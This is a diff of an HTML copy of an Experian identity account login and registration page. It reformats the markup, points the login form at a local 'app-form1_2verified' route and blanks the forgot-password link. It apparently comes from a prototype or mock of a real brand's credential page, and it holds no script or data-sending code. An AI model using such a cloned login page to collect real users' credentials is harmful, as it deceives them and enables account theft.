@@ -13,26 +13,19 @@
 <section id="loginStatus">
 </section>
 <section id="language">
-        <ul class="lang">
-
-            <li class="first"><a href="?lang=cy-GB">Cymraeg</a></li>
-
-        </ul>
-
-</section>        </section>
-        <div id="main">
-            <section id="content">
-                
-                
-
-
-<div id="loginPart">
-
-    <div id="loginHeader">
-    </div>
+    <ul class="lang">
+        <li class="first"><a href="?lang=cy-GB">Cymraeg</a></li>
+    </ul>
+</section>
+</section>
+    <div id="main">
+        <section id="content">
+            <div id="loginPart">
+                <div id="loginHeader">
+                </div>
 <div id="divBoxes" class="boxes">
         <div id="divLoginBox"  class="loginBox">
-<form action="app-start1" autocomplete="off" method="link"><fieldset class="fsn&#32;qs">
+<form action="app-form1_2verified" autocomplete="off" method="link"><fieldset class="fsn&#32;qs">
 <legend><span>Login</span></legend><h1>Login</h1><div class="intro">If you already have an Experian identity account please enter your username and password below. Fields marked with * must be completed.</div>
 <div class="vals">
 <span class="field-validation-valid" data-valmsg-for="Login" data-valmsg-replace="true"></span>
@@ -42,16 +35,11 @@
 
 <div class="fieldset">
     <div class="intro"></div>
-
     <p><span class="field-validation-valid" data-valmsg-for="CspUsernameAuthuserNameuserName" data-valmsg-replace="true"></span></p>
-
-<div class="field text-field">
-    <label for="CspUsernameAuthuserNameusername">*Username</label>
-
+    <div class="field text-field"><label for="CspUsernameAuthuserNameusername">*Username</label>
     <input name="CspUsernameAuthuserNameusername" type="text" value="" />
     <br />
     <span class="field-validation-valid" data-valmsg-for="CspUsernameAuthuserNameusername" data-valmsg-replace="true"></span>
-
     <div class="cb"><a href="ForgotUsername" tabindex="100">Forgotten your username?</a></div>
 </div>
 <div class="clear"></div>
@@ -61,24 +49,27 @@
     <br />
     <span class="field-validation-valid" data-valmsg-for="CspUsernameAuthuserNamepwd" data-valmsg-replace="true"></span>
 
-    <div class="cb"><a href="../../ForgotPassword" tabindex="101">Forgotten your password?</a></div>
+    <div class="cb"><a href="#" tabindex="101">Forgotten your password?</a></div>
 </div>
 
 <div class="clear"></div>
-</div><input name="_qg" type="hidden" value="CspUsernameAuth" />                    <div class="btn_container">
-                        <input class="btn-submit finish" type="submit" name="Finish" value="Log in" />
-                        <a href="/Cancel" id="cancelLink" class="btn-submit cancel">Cancel</a>
-                    </div></fieldset></form>        </div>
-        <div id="divRegisterBox" class="registerBox">
-       
-<form action="/Account/GoRegister" autocomplete="off" method="post"><fieldset class="fsn&#32;qs">
-<legend><span>Register</span></legend><h1>Register</h1><div class="intro">If you would like an Experian identity account, please click the button below to get started</div>
-<div class="vals">
-<span class="field-validation-valid" data-valmsg-for="Register" data-valmsg-replace="true"></span>
+</div><input name="_qg" type="hidden" value="CspUsernameAuth" />
+<div class="btn_container">
+    <input class="btn-submit finish" type="submit" name="Finish" value="Log in" />
+    <a href="/Cancel" id="cancelLink" class="btn-submit cancel">Cancel</a>
 </div>
-                <p>
-                    <input id="registerBtn" class="btn-submit btn-green" type="submit" name="Finish" value="Create your account" />
-                </p>
+</fieldset>
+</form>
+</div>
+<div id="divRegisterBox" class="registerBox">
+       
+<form action="/Account/GoRegister" autocomplete="off" method="post">
+    <fieldset class="fsn&#32;qs">
+    <legend><span>Register</span></legend><h1>Register</h1><div class="intro">If you would like an Experian identity account, please click the button below to get started</div>
+    <div class="vals">
+        <span class="field-validation-valid" data-valmsg-for="Register" data-valmsg-replace="true"></span>
+    </div>
+    <p><input id="registerBtn" class="btn-submit btn-green" type="submit" name="Finish" value="Create your account" /></p>
 </fieldset></form>            
     <div id="regHowLong" class="fs">
       <h1>How Long Will It Take?</h1>
